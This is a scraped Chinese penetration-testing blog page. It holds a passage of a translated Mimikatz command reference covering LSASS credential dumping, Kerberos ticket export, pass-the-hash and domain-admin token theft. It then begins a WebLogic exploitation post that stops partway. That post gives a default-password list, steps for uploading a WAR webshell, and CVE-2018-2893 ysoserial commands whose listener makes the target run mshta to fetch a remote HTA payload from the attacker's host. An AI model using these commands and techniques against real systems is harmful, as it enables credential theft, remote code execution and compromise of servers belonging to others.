<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-RPC-Server.png" alt="img"></p>
<h4 id="SEKURLSA"><a href="#SEKURLSA" class="headerlink" title="SEKURLSA"></a><strong>SEKURLSA</strong></h4><p>SEKURLSA Mimikatz模块与受保护的内存进行交互。该模块从lsass（本地安全机构子系统服务）的内存中提取密码，密钥，密码，票据。<br>为了与LSASS进行交互，Mimikatz流程需要适当的权利：</p>
<ul>
<li>管理员，通过<em>“PRIVILEGE::Debug”</em>获取debug权限</li>
<li>系统权利（<em>“TOKEN::elevate”）</em></li>
</ul>
<p>但是，对于转储的LSASS进程文件（即LSASS.dmp）运行时，不需要提升权限。</p>
<p><strong>SEKURLSA::Backupkeys</strong> - 获取首选备份主密钥</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-Backupkeys.jpg" alt="Mimikatz-sekurlsa-Backupkeys"></a></p>
<p><strong>SEKURLSA::Credman</strong> - 列出凭据管理器</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Credman.png" alt="Mimikatz-Sekurlsa-Credman"></a></p>
<p><strong>SEKURLSA::Dpapi</strong> - 列出缓存的MasterKeys</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPI.png" alt="Mimikatz-Sekurlsa-DPAPI"></a></p>
<p><strong>SEKURLSA::DpapiSystem</strong> - DPAPI_SYSTEM秘密</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-DPAPISystem.png" alt="Mimikatz-Sekurlsa-DPAPISystem"></a></p>
<p><strong>SEKURLSA::Ekeys</strong> - 列出Kerberos加密密钥</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-EKeys.png" alt="Mimikatz-Sekurlsa-EKeys"></a></p>
<p><strong>SEKURLSA::Kerberos</strong> - 列出所有经过身份验证的用户（包括服务和计算机帐户）的Kerberos凭据</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Kerberos.png" alt="Mimikatz-Sekurlsa的Kerveros"></a></p>
<p><strong>SEKURLSA::Krbtgt</strong> - 获取Domain Kerberos服务帐户（KRBTGT）密码数据</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-KrbTGT.png" alt="Mimikatz-Sekurlsa-KRBTGT"></a></p>
<p><strong>SEKURLSA::LiveSSP</strong> - 列出LiveSSP凭据</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-LiveSSP.png" alt="Mimikatz-Sekurlsa-LiveSSP"></a></p>
<p><strong>SEKURLSA::LogonPasswords</strong> - 列出所有可用的提供者凭据。这通常显示最近登录的用户和计算机凭据。</p>
<ul>
<li>在LSASS中转储当前登录（或最近登录）帐户的密码数据以及在用户凭据上下文中运行的服务。</li>
<li>帐户密码以可逆方式存储在内存中。如果它们在内存中（在Windows 8.1 / Windows Server 2012 R2之前），则会显示它们。在大多数情况下，Windows 8.1 / Windows Server 2012 R2不以这种方式存储帐户密码。KB2871997将此安全功能“后端”移植到Windows 7，Windows 8，Windows Server 2008R2和Windows Server 2012，但在应用KB2871997后计算机需要其他配置。</li>
<li>需要管理员访问权限（具有debug权限）或本地系统权限</li>
</ul>
<p><strong>Windows Server 2008 R2系统（显示密码）。</strong>                                                </p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win10_thumb.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2  - 第1部分"></a> </p>
<p><strong>Windows Server 2012 R2系统 - 未显示明文密码</strong></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R21.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2012R2_thumb1.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2012R2"></a></p>
<p>使用此命令也会转储使用帐户凭据运行的服务。<br>请注意，只能以这种方式转储正在运行的服务（内存中的凭据）。</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/WindowsServer2008R2-SQLServices_thumb.png" alt="WindowsServer2008R2，SQLServices"></a></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part22.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part2_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump  - 第2部分"></a></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part32.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump-Part3_thumb2.png" alt="Mimikatz-Sekurlsa-logonpasswords-Win2008R2-ServicePasswordDump，第3部分"></a></p>
<p><strong>SEKURLSA::Minidump</strong> - 切换到LSASS minidump进程上下文</p>
<p>转储LSASS有几种不同的方法：   <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">procdump</a>，<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1" target="_blank" rel="noopener">PowerShell</a>，任务管理器等。</p>
<p>请注意，需要使用从NT5 Win32或NT5x64或NT6 Win32或NT6 x64转储的相同平台来读取Minidump。<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Minidump.png" alt="Mimikatz-Sekurlsa，小型转储"></a></p>
<p>另一种选择是使用任务管理器转储LSASS进程</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Dump-LSASS-With-TaskManager.png" alt="img"></p>
<p>Sekurlsa::minidump可以打开转储文件。</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-sekurlsa-minidump-02.png" alt="img"> <img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-sekurlsa-minidump-01.png" alt="img"></p>
<p><strong>SEKURLSA::MSV</strong> - 列出LM和NTLM凭证</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-MSV.png" alt="Mimikatz-Sekurlsa-MSV"></a></p>
<p><strong>SEKURLSA::Process</strong> - 切换到LSASS流程上下文</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-Process.png" alt="Mimikatz-Sekurlsa进程"></a></p>
<p><strong>SEKURLSA::Pth</strong> - 传递哈希和过传哈希（又称传球）。</p>
<p><em>Mimikatz可以执行众所周知的操作’Pass-The-Hash’来使用用户密码的NTLM哈希而不是真实密码在另一个凭据下运行进程。为此，它启动具有假身份的进程，然后用真实信息（真实密码的NTLM哈希）替换虚假信息（伪密码的NTLM哈希）。</em></p>
<ul>
<li>/ user - 您要模拟的用户名，请记住，管理员不是此知名帐户的唯一名称。</li>
<li>/ domain - 完全限定的域名 - 没有域或在本地用户/ admin的情况下，使用计算机或服务器名称，工作组或其他。</li>
<li>/ rc4或/ ntlm - 可选 - 用户密码的RC4密钥/ NTLM哈希值。</li>
<li>/ run - 可选 - 要运行的命令行 - 默认为：cmd有shell。</li>
</ul>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" alt="Mimikatz-Sekurlsa-PTH"></a></p>
<p>本杰明的备注：</p>
<ul>
<li>此命令不适用于minidumps（废话）;</li>
<li>它需要提升的权限（privilege::debug或SYSTEM帐户），而不像使用一个官方API的“Pass-The-Ticket”;<br>这个新版本的’Pass-The-Hash’用ntlm哈希替换Kerberos的RC4密钥（和/或替换AES密钥） - 它允许Kerberos提供者询问TGT门票！;</li>
<li>在XP / 2003 / Vista / 2008和7 / 2008r2 / 8/2012 kb2871997之前必须使用ntlm哈希（AES不可用或不可替换）;</li>
<li>AES密钥只能在8.1 / 2012r2或7 / 2008r2 / 8/2012上用kb2871997替换，在这种情况下，您可以避免使用ntlm哈希。</li>
</ul>
<p><a href="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash" target="_blank" rel="noopener">本杰明在立交桥上的帖子</a>。</p>
<p><strong>SEKURLSA::SSP</strong> - 列出SSP凭据</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png" alt="Mimikatz-Sekurlsa-SSP"></a></p>
<p><strong>SEKURLSA::Tickets</strong> - 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户下运行的服务。<br>与kerberos::list不同，sekurlsa使用内存读取，不受关键出口限制。sekurlsa可以访问其他会话（用户）的门票。</p>
<ul>
<li>/ export - 可选 - 票证以.kirbi文件导出。它们以用户的LUID和组号开头（0 = TGS，1 =客户票（？）和2 = TGT）</li>
</ul>
<p>与LSASS的凭证转储类似，使用sekurlsa模块，攻击者可以在系统内存中获取所有Kerberos票证数据，包括属于管理员或服务的数据。<br>如果攻击者破坏了为用户使用后端SQL服务器访问的Kerberos委派配置的Web服务器，则此功能非常有用。这使攻击者能够捕获并重用该服务器上内存中的所有用户票证。</p>
<p>“kerberos::tickets”mimikatz命令转储当前登录用户的Kerberos票证，不需要提升权限。利用sekurlsa模块从受保护内存（LSASS）读取的功能，可以转储系统上的所有Kerberos票证。</p>
<p>命令：  <em>mimikatz sekurlsa ::门票退出</em></p>
<ul>
<li>转储系统上所有经过身份验证的Kerberos票证。</li>
<li>需要管理员访问权限（带有debug权限）或本地系统权限</li>
</ul>
<p>以下屏幕截图显示了另一个域管理员用户（LukeSkywalker）的转储密码和Kerberos票证（TGS和TGT）。</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets_thumb.png" alt="Mimikatz-SekurlsaTickets"></a><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets  - 第2部分，AdminTGT"></a></p>
<p>以下屏幕截图显示了另一个管理员（HanSolo）的转储凭据和Kerberos票证（TGS和TGT）。</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-3部分，AdminTGT"></a></p>
<p>以下屏幕截图显示了SQL服务帐户（svc-SQLDBEngine01）的转储凭据和Kerberos票证（TGS和TGT）。</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT.png" target="_blank" rel="noopener"><img src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-4部分，ServiceTGT"></a></p>
<p><strong>SEKURLSA::Trust</strong> - 获取信任密钥<br><em>（我认为这是不赞成使用lsadump::trust / patch）</em></p>
<p><strong>SEKURLSA::TSPKG</strong> - 列出TsPkg证书</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png" alt="Mimikatz-Sekurlsa-TSPKG"></a></p>
<p><strong>SEKURLSA::Wdigest</strong> - 列出WDigest凭据</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" alt="Mimikatz-sekurlsa-wdigest"></a></p>
<h4 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h4><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a><strong>服务</strong></h4><p><strong>SERVICE::+</strong>   （加号） - 安装Mimikatz服务（’mimikatzsvc’）</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Service-Plus.png" alt="img"></p>
<p><strong>SERVICE::-</strong>  (minus sign)  - 卸载Mimikatz服务（’mimikatzsvc’）</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Service-Minus.png" alt="img"></p>
<p><strong>SERVICE::List</strong> - 列出服务</p>
<p><strong>SERVICE::Me</strong></p>
<p><strong>SERVICE::Preshutdown</strong> - preshutdown服务</p>
<p><strong>SERVICE::Remove</strong>  删除服务</p>
<p><strong>SERVICE::Resume</strong> - 恢复服务</p>
<p><strong>SERVICE::Shutdown</strong> - 关闭服务</p>
<p><strong>SERVICE::Start</strong>  - 启动服务</p>
<p><strong>SERVICE::Stop</strong> - 停止服务</p>
<p><strong>SERVICE::Suspend</strong> - 暂停服务</p>
<h4 id="SID"><a href="#SID" class="headerlink" title="SID"></a><strong>SID</strong></h4><p>Mimikatz SID模块取代了MISC::AddSID。使用SID::Patch修补ntds服务。</p>
<p><strong>SID::add</strong> - 将SID添加到对象的SIDHistory</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-add.png" alt="Mimikatz-SID加"></a></p>
<p><strong>SID::clear</strong> - 清除对象的SIDHistory</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-clear-query.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-clear-query.png" alt="Mimikatz-SID清晰查询"></a></p>
<p><strong>SID::lookup</strong> - 名称（/ name）或SID（/ sid）查找</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Lookup.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Lookup.png" alt="Mimikatz-SID的查找"></a></p>
<p><strong>SID::modify</strong> - 修改对象的对象SID</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Modify.png" alt="Mimikatz-SID-修改"></a></p>
<p><strong>SID::patch</strong> - 补丁NTDS服务</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Patch.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-Patch.png" alt="Mimikatz-SID贴片"></a></p>
<p><strong>SID::query</strong> - 按SID或名称查询对象</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-query.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-SID-query.png" alt="Mimikatz-SID查询"></a></p>
<h4 id="STANDARD"><a href="#STANDARD" class="headerlink" title="STANDARD"></a><strong>STANDARD</strong></h4><p><strong>STANDARD::Answer</strong>–- 回答生命，宇宙和万物的终极问题。</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Answer.png" alt="img"></p>
<p><strong>STANDARD::Base64</strong> - 将输出切换到base64输出</p>
<p><strong>STANDARD::CD</strong> - 更改或显示当前目录</p>
<p><strong>STANDARD::CLS</strong> - 清除屏幕</p>
<p><strong>STANDARD::Coffee</strong> - 显示<strong>咖啡</strong>的ASCII图像!</p>
<p><strong>STANDARD::Exit</strong>–退出Mimikatz</p>
<p><strong>STANDARD::Hostname</strong>  - 显示系统本地主机</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Hostname.png" alt="img"></p>
<p><strong>STANDARD::LocalTime</strong>  - 显示系统本地日期和时间（OJ命令）</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-LocalTime.png" alt="img"></p>
<p><strong>STANDARD::Log</strong> - 将Mimikatz数据发送到日志文件</p>
<p><strong>STANDARD::MarkRus</strong> - 传递哈希信息。<br><em>在Mimikatz 2.1.1中删除</em></p>
<p><strong>STANDARD::Sleep</strong> - 睡眠时间为毫秒</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Sleep.png" alt="img"></p>
<p><strong>STANDARD::Version</strong> - 显示版本信息</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Standard-Version.png" alt="img"></p>
<h4 id="SYSENV"><a href="#SYSENV" class="headerlink" title="SYSENV"></a><strong>SYSENV</strong></h4><p>Mimikatz SYSENV模块提供管理系统环境变量的功能。</p>
<p><strong>SYSENV ::列出SYSENV ::获取SYSENV ::设置SYSENV::Del</strong></p>
<h4 id="TOKEN"><a href="#TOKEN" class="headerlink" title="TOKEN"></a><strong>TOKEN</strong></h4><p>Mimikatz Token模块使Mimikatz能够与Windows身份验证令牌进行交互，包括抓取和模拟现有令牌。</p>
<p><strong>TOKEN::Elevate</strong> - 模拟令牌。用于将权限提升为SYSTEM（默认）或使用Windows API在框中查找域管理员令牌。<br><em>需要管理员权限。</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-1.png" alt="Mimikatz令牌，Elevate1"></a></p>
<p>在框中找到域管理员凭据并使用该令牌：<em>token::elevate / domainadmin</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" alt="Mimikatz令牌 - 提升 -  DomainAdmin"></a></p>
<p><strong>TOKEN::List</strong> - 列出系统的所有令牌</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png" alt="Mimikatz令牌名录"></a></p>
<p><strong>TOKEN::Revert</strong> - 恢复为进程令牌</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png" alt="Mimikatz-令牌WHOAMI"></a></p>
<p><strong>TOKEN::Run</strong>  - Run</p>
<p><strong>TOKEN::Whoami</strong> - 显示当前身份</p>
<h4 id="TS"><a href="#TS" class="headerlink" title="TS"></a><strong>TS</strong></h4><p><strong>TS::MultiRDP</strong> - （实验性）补丁终端服务器服务允许多个用户</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png" alt="Mimikatz-TS-MultiRDP"></a></p>
<p><strong>TS::Sessions</strong>  - 列出TS / RDP会话。</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-TS-Sessions.png" alt="img"></p>
<p><strong>TS ::远程</strong> </p>
<h4 id="VAULT"><a href="#VAULT" class="headerlink" title="VAULT"></a><strong>VAULT</strong></h4><p><strong>VAULT::List</strong> - 列出保险库凭证</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png" alt="Mimikatz保管箱名录"></a></p>
<p><strong>VAULT::Cred</strong> - cred</p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-中间件安全-Weblogic漏洞利用与安全加固"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/">Weblogic漏洞利用与安全加固</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/" class="article-date">
	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>  WebLogic是美国bea公司出品的一个application server，确切的说是一个基于Javaee架构的中间件，纯java开发的，最新版本WebLogic Server 12cR2 (12.2.1.3)(截至发文前)是迄今为止发布的最卓越的BEA应用服务器。BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。完全遵循J2EE 1.4规范。</p>
<p>安装：<a href="https://blog.csdn.net/acmman/article/details/70093877" target="_blank" rel="noopener">https://blog.csdn.net/acmman/article/details/70093877</a></p>
<h2 id="0x01漏洞利用"><a href="#0x01漏洞利用" class="headerlink" title="0x01漏洞利用"></a>0x01漏洞利用</h2><h3 id="1、-默认管理控制台入口"><a href="#1、-默认管理控制台入口" class="headerlink" title="1、    默认管理控制台入口,"></a>1、    默认管理控制台入口,</h3><p>端口扫描 + web 搜索引擎 + 空间搜索引擎</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -Pn -v --open -p 80,7000-10000 192.168.3.195	考虑到精度,建议直接在目标 C 段跑,weblogic 默认端口为 7001,但通常情况下都会被目标管理员改掉,所以实战中端口最好稍微放大点</span><br></pre></td></tr></table></figure>
<p>如何精确识别 weblogic 版本是否在漏洞范围内,其实在控制台入口页面的左下角就有详细显示</p>
<h3 id="2、部署War包传Webshell"><a href="#2、部署War包传Webshell" class="headerlink" title="2、部署War包传Webshell"></a>2、部署War包传Webshell</h3><p>1)    常见 weblogic 入口弱口令列表如下,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">administrator:password </span><br><span class="line">weblogic:password </span><br><span class="line">weblogic:weblogic </span><br><span class="line">weblogic:weblogic1 </span><br><span class="line">weblogic:welcome1 </span><br><span class="line">weblogic:Oracle@123 </span><br><span class="line">system:weblogic </span><br><span class="line">system:password </span><br><span class="line">system:security </span><br><span class="line">system:system </span><br><span class="line">portaladmin:portaladmin</span><br><span class="line">wlcsystem:wlcsystem </span><br><span class="line">wlpisystem:wlpisystem </span><br><span class="line">admin:security</span><br><span class="line">joe:password</span><br><span class="line">guest:guest</span><br></pre></td></tr></table></figure>
<p>2)    当我们登录成功后,就可以立即尝试部署自己的 war 包 webshell 了,以下方法对于 weblogic 10.x - 12.x 版本几乎通用,具体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先,登到 weblogic 控制台中,点击&apos; 锁定并编辑&apos; -&gt; &apos; 部署&apos;</span><br><span class="line"></span><br><span class="line">选择 &apos;安装&apos;</span><br><span class="line"></span><br><span class="line">选中自己事先准备好的 war 包 webshell [ 依然还是用我们之前文章中的那个 war 包 ],选择第一项 &apos;将部署上载到管理服务器&apos;,然后点击下一步</span><br><span class="line"></span><br><span class="line">根据提示可以看到, 此时我们的 war 包已经上传成功了,就在如下的目录中,继续...</span><br><span class="line"></span><br><span class="line">给该部署命名,此处为了防止出问题,建议保持默认</span><br><span class="line"></span><br><span class="line">点击&apos; 完成&apos;后,会提示 &apos;设置更新成功&apos;</span><br><span class="line"></span><br><span class="line">此时再次回到&apos;部署&apos;选项中,选中刚刚部署的 cmd 应用程序,点击&apos;启动&apos;服务,注意,此处一定要来自己手工启动服务,不然 shell 是部署不上的</span><br><span class="line"></span><br><span class="line">选择&apos; 是&apos;</span><br></pre></td></tr></table></figure>
<p>看到上面提示已启动部署,此时再用浏览器访问 http://[本地IP]:7001/cmd/cmd.jsp 就可以看到我们的 shell 了,如下</p>
<h3 id="3、-Weblogic远程代码执行漏洞-CVE-2018-2893"><a href="#3、-Weblogic远程代码执行漏洞-CVE-2018-2893" class="headerlink" title="3、   Weblogic远程代码执行漏洞[CVE-2018-2893]"></a>3、   Weblogic远程代码执行漏洞[CVE-2018-2893]</h3><p><strong><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></strong></p>
<blockquote>
<ul>
<li>Weblogic 10.3.6.0</li>
<li>Weblogic 12.1.3.0</li>
<li>Weblogic 12.2.1.2</li>
<li>Weblogic 12.2.1.3</li>
</ul>
</blockquote>
<p>漏洞验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2018-2893-test.py [目标IP] 7001</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-cve-2018-2893.jar JRMPClient4 &quot;[本地IP]:1099&quot; &gt; shell.cer</span><br><span class="line">java -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;mshta.exe [本地IP] /options.hta&quot;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python weblogic.py [目标IP] 7001 shell.cer	在远程目标机器上执行该 payload</span><br></pre></td></tr></table></figure>
<h3 id="4、反序列化远程代码执行-CVE-2018-2628"><a href="#4、反序列化远程代码执行-CVE-2018-2628" class="headerlink" title="4、反序列化远程代码执行 [CVE-2018-2628]"></a>4、反序列化远程代码执行 [CVE-2018-2628]</h3><p>基本原理：由于 weblogic 对于 T3 协议发送的数据包没有过滤,注册一个 RMI 接口,通过 T3 协议建立连接,加载回来再一步步解包,利用 readObject 解析,从而造成了反序列化远程代码执行 </p>
<blockquote>
<p>影 响 版 本 :</p>
